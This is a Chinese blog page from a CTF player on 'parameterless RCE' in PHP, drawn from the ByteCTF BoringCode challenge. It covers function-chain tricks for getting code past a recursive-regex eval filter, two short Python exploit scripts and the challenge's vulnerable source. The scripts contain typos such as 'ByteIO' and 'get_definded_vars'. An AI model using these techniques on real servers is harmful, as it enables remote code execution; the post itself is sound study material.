@@ -1,0 +1,238 @@
+<!DOCTYPE html>
+<html lang="zh">
+  <head>
+    
+<meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width,user-scalable=no,initial-scale=1,minimum-scale=1,maximum-scale=1">
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+  <meta name="description" content="无参数rce举例学习"/>
+
+
+
+
+  <meta name="keywords" content="技术辣鸡的PHP," />
+
+
+
+
+
+  <link rel="alternate" href="/default" title="RuoWeber">
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=1.1" />
+
+
+
+<link rel="canonical" href="http://yoursite.com/2019/09/09/无参数rce举例学习/"/>
+
+
+<meta name="description" content="文章原由本文是因为ByteCTF中的一道题而学习到的，学的比较浅，简单记录下。 什么是无参数rce(读取文件)这个来源于一段正则: 123if(&amp;apos;;&amp;apos;===preg_replace(&amp;apos;[a-z]+\((?R)?\)&amp;apos;,&amp;apos;NULL&amp;apos;,$_GET[&amp;apos;code&amp;apos;]))&amp;#123;    eval($_GET[&amp;apos;co">
+<meta name="keywords" content="技术辣鸡的PHP">
+<meta property="og:type" content="article">
+<meta property="og:title" content="无参数rce举例学习">
+<meta property="og:url" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2019&#x2F;09&#x2F;09&#x2F;%E6%97%A0%E5%8F%82%E6%95%B0rce%E4%B8%BE%E4%BE%8B%E5%AD%A6%E4%B9%A0&#x2F;index.html">
+<meta property="og:site_name" content="RuoWeber">
+<meta property="og:description" content="文章原由本文是因为ByteCTF中的一道题而学习到的，学的比较浅，简单记录下。 什么是无参数rce(读取文件)这个来源于一段正则: 123if(&amp;apos;;&amp;apos;===preg_replace(&amp;apos;[a-z]+\((?R)?\)&amp;apos;,&amp;apos;NULL&amp;apos;,$_GET[&amp;apos;code&amp;apos;]))&amp;#123;    eval($_GET[&amp;apos;co">
+<meta property="og:locale" content="zh">
+<meta property="og:updated_time" content="2019-11-11T03:44:18.964Z">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="stylesheet" type="text/css" href="/css/style.css?v=1.1" />
+<link href='https://fonts.googleapis.com/css?family=Open+Sans' rel='stylesheet'>
+
+
+
+
+
+<script type="text/javascript">
+  var themeConfig = {
+    fancybox: {
+      enable: false
+    },
+  };
+</script>
+
+
+
+
+  
+
+
+
+    <title> 无参数rce举例学习 - RuoWeber </title>
+  </head>
+
+  <body>
+    <div id="page">
+      <header id="masthead"><div class="site-header-inner">
+    <h1 class="site-title">
+        <a href="/." class="logo">RuoWeber</a>
+    </h1>
+
+    <nav id="nav-top">
+        
+            <ul id="menu-top" class="nav-top-items">
+                
+                    <li class="menu-item">
+                        <a href="/archives">
+                            
+                            
+                                Archives
+                            
+                        </a>
+                    </li>
+                
+                    <li class="menu-item">
+                        <a href="/about">
+                            
+                            
+                                About
+                            
+                        </a>
+                    </li>
+                
+            </ul>
+        
+  </nav>
+</div>
+
+      </header>
+      <div id="content">
+        
+    <div id="primary">
+        
+  <article class="post">
+    <header class="post-header">
+      <h1 class="post-title">
+        
+          无参数rce举例学习
+        
+      </h1>
+
+      <time class="post-time">
+          Sep 09 2019
+      </time>
+    </header>
+
+
+
+    
+            <div class="post-content">
+            <h1 id="文章原由"><a href="#文章原由" class="headerlink" title="文章原由"></a>文章原由</h1><p>本文是因为ByteCTF中的一道题而学习到的，学的比较浅，简单记录下。</p>
+<h1 id="什么是无参数rce-读取文件"><a href="#什么是无参数rce-读取文件" class="headerlink" title="什么是无参数rce(读取文件)"></a>什么是无参数rce(读取文件)</h1><p>这个来源于一段正则:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if(&apos;;&apos;===preg_replace(&apos;[a-z]+\((?R)?\)&apos;,&apos;NULL&apos;,$_GET[&apos;code&apos;]))&#123;</span><br><span class="line">    eval($_GET[&apos;code&apos;]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<a id="more"></a>
+<h2 id="正则解析"><a href="#正则解析" class="headerlink" title="正则解析"></a>正则解析</h2><p>这个正则的里面看不懂的就是(?R)这个吧，这个是pcre正则后来又添加的一个特殊标志，表示去递归正则匹配表达式(这个就可以用来做那种检查括号匹配的正则)，<code>\((?R)?\)</code>,这样看来，这段php代码只能传参类似a(b(c()))这种样式代码，就相当于利用无参数函数去getshell(文件读取)，下面举例的这些姿势来自<a href="https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE/" target="_blank" rel="noopener">飘零大佬的博客</a>,(orz).</p>
+<h2 id="1-getenv"><a href="#1-getenv" class="headerlink" title="1.getenv()"></a>1.getenv()</h2><p>getenv()获取当前的环境变量，并返回一个数组，那么怎么利用这个呢？注意到函数<code>array_rand()</code>，这个函数被传入一个数组，然后返回一个随机的数组元素的下标，但是鸡肋的地方在于这些环境变量的数组，下标一般没啥用，主要在其值上起作用，但是另一个函数<code>array_flip()</code>，就显得很给力，该函数可以把数组的下标和键值互换，生成一个新的数组并返回，于是便可利用<code>array_rand(array_flip(getenv()));</code>来爆破。</p>
+<h2 id="2-getallheaders"><a href="#2-getallheaders" class="headerlink" title="2.getallheaders()"></a>2.getallheaders()</h2><p>在apache下，我们可以利用这个获取到http的headers，这样我们只要在请求包的headers造一个恶意的数据，然后去在eval的地方用getallheaders获取到即可rce，比如说下面这个<code>var_dump(end(getallheaders()));</code>，这里说一下end(),next()，和current(),他们都是通过数组的指针来获取数组的元素，只不过获取的具体位置不同。</p>
+<h2 id="3-get-definded-vars"><a href="#3-get-definded-vars" class="headerlink" title="3.get_definded_vars()"></a>3.get_definded_vars()</h2><p>getallheaders()只在apache上有用，局限性也比较大，get_definded_vars()回显全局变量，在服务器上，可能回显到($_GET,$_POST,$_FILES,$_COOKIE)，所以这个利用也就很多方式了，get，post，cookie可能会受到限制，这里从飘零大佬学一个file的利用脚本</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">from io import BytesIO</span><br><span class="line"></span><br><span class="line">payload=&quot;system(&apos;ls /tmp&apos;);&quot;.encode(&apos;hex&apos;)</span><br><span class="line">files=&#123;</span><br><span class="line">    payload: ByteIO(&apos;xxx&apos;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">r = requests.post(&apos;url&apos;/?code=&apos;eval(hex2bin(array_rand(end(get_definded_vars()))));&apos;,files=files)</span><br><span class="line">print r.content</span><br></pre></td></tr></table></figure>
+
+<p>这里的hex编码是为了防止空格或者一些特殊字符被转义或替代。</p>
+<h2 id="4-session-id"><a href="#4-session-id" class="headerlink" title="4.session_id()"></a>4.session_id()</h2><p>由于PHPSESSID可以有数字和字母，这个便也可以利用。飘零大佬的脚本(orz)。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">url = &apos;http://localhost/?code=eval(hex2bin(session_id(session_start())));&apos;</span><br><span class="line">payload = &quot;echo &apos;sky cool&apos;;&quot;.encode(&apos;hex&apos;)</span><br><span class="line">cookies = &#123;</span><br><span class="line">	&apos;PHPSESSID&apos;:payload</span><br><span class="line">&#125;</span><br><span class="line">r = requests.get(url=url,cookies=cookies)</span><br><span class="line">print r.content</span><br></pre></td></tr></table></figure>
+
+<h2 id="5-dirname-与chdir"><a href="#5-dirname-与chdir" class="headerlink" title="5.dirname()与chdir()"></a>5.dirname()与chdir()</h2><p>我们可以看出，上面这些都是基本没有过滤时可以实现，但是稍微一加限制，我们可能就无法getshell，但是如果能读取文件也不错，我们可以readfile(),dirname,chdir()来结合getcwd(),scandir()等来实现</p>
+<h2 id="感受"><a href="#感受" class="headerlink" title="感受"></a>感受</h2><p>无参数rce(文件读取)姿势肯定还有很多，主要看对php函数的利用。</p>
+<h1 id="ByteCTF-BoringCode"><a href="#ByteCTF-BoringCode" class="headerlink" title="ByteCTF BoringCode"></a>ByteCTF BoringCode</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">function is_valid_url($url) &#123;</span><br><span class="line">    if (filter_var($url, FILTER_VALIDATE_URL)) &#123;</span><br><span class="line">        if (preg_match(&apos;/data:\/\//i&apos;, $url)) &#123;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line">    return false;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if (isset($_POST[&apos;url&apos;]))&#123;</span><br><span class="line">    $url = $_POST[&apos;url&apos;];</span><br><span class="line">    if (is_valid_url($url)) &#123;</span><br><span class="line">        $r = parse_url($url);</span><br><span class="line">        if (preg_match(&apos;/baidu\.com$/&apos;, $r[&apos;host&apos;])) &#123;</span><br><span class="line">            $code = file_get_contents($url);</span><br><span class="line">            if (&apos;;&apos; === preg_replace(&apos;/[a-z]+\((?R)?\)/&apos;, NULL, $code)) &#123;</span><br><span class="line">                if (preg_match(&apos;/et|na|nt|strlen|info|path|rand|dec|bin|hex|oct|pi|exp|log/i&apos;, $code)) &#123;</span><br><span class="line">                    echo &apos;bye~&apos;;</span><br><span class="line">                &#125; else &#123;</span><br><span class="line">                    eval($code);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            echo &quot;error: host not allowed&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        echo &quot;error: invalid url&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这题前面域名那的本来想的绕过，但是利用<code>0://url;baidu.com</code>等畸形url绕过前面的以后，file_get_contents还是无法利用,看完wp，才明白这是ByteDance这是来调戏Baidu的，直接注册一个结尾为baidu.com域名来绕过正则即可，解析到自己的服务器上，直接无参数读取文件就完事了（当然绕过过滤）,</p>
+<p>这里参考到<a href="https://altman.vip/2019/09/09/ByteCTF-WEB/" target="_blank" rel="noopener">这篇博客</a>,利用localeconv()返回数组的第一个产生‘.’，(current使用pos代替),便可scandir到’.’和‘..’(next)，如果我们仅仅读取当前目录的上一级目录，感觉完全可以不去chdir跳目录，直接读取就vans了，但是目录如果层数相差很多肯定要去用chdir切换当前目录，但是这里chdir返回的时bool值，dirname(chdir(‘..’))，不可行，因为dirname被过滤了，这里看到博客作者的一种方法,利用time函数去接受bool值，然后localtime函数接收time函数返回值，并且它会返回数组，取出秒数，当值为46时，chr(46)会转换位’.’，这样便可以实现chdir后，用一个(几个)函数接收bool值并且返回’.’</p>
+<p>参考:</p>
+<p><a href="https://altman.vip/2019/09/09/ByteCTF-WEB/" target="_blank" rel="noopener">altman</a></p>
+<p><a href="https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE/" target="_blank" rel="noopener">Skysec-PHP Parametric Function RCE</a></p>
+
+            </div>
+          
+
+    
+      <footer class="post-footer">
+		
+		<div class="post-tags">
+		  
+			<a href="/tags/%E6%8A%80%E6%9C%AF%E8%BE%A3%E9%B8%A1%E7%9A%84PHP/">技术辣鸡的PHP</a>
+		  
+		</div>
+		
+
+        
+        
+  <nav class="post-nav">
+    
+      <a class="prev" href="/2019/09/10/DayliyRecord/">
+        <i class="iconfont icon-left"></i>
+        <span class="prev-text nav-default">DayilyRecord</span>
+        <span class="prev-text nav-mobile">Prev</span>
+      </a>
+    
+    
+      <a class="next" href="/2019/09/08/FlaskJinja2SSTI/">
+        <span class="next-text nav-default">FlaskJinja2SSTI</span>
+        <span class="prev-text nav-mobile">Next</span>
+        <i class="iconfont icon-right"></i>
+      </a>
+    
+  </nav>
+
+        
+  <div class="comments" id="comments">
+    
+  </div>
+
+
+      </footer>
+    
+  </article>
+
+    </div>
+
+      </div>
+
+      <footer id="colophon"><span class="copyright-year">
+    
+        &copy;
+    
+        2014 -
+    
+    2020
+    <span class="footer-author">asy.</span>
+    <span class="power-by">
+        Powered by <a class="hexo-link" href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a> and <a class="theme-link" href="https://github.com/frostfan/hexo-theme-polarbear" target="_blank" rel="noopener">Polar Bear</a>
+    </span>
+</span>
+
+      </footer>
+
+      <div class="back-to-top" id="back-to-top">
+        <i class="iconfont icon-up"></i>
+      </div>
+    </div>
+    
+
+
+    
+
+
+
+
+  
+    <script type="text/javascript" src="/lib/jquery/jquery-3.1.1.min.js"></script>
+  
+
+  
+
+    <script type="text/javascript" src="/js/src/theme.js?v=1.1"></script>
+<script type="text/javascript" src="/js/src/bootstrap.js?v=1.1"></script>
+
+  </body>
+</html>
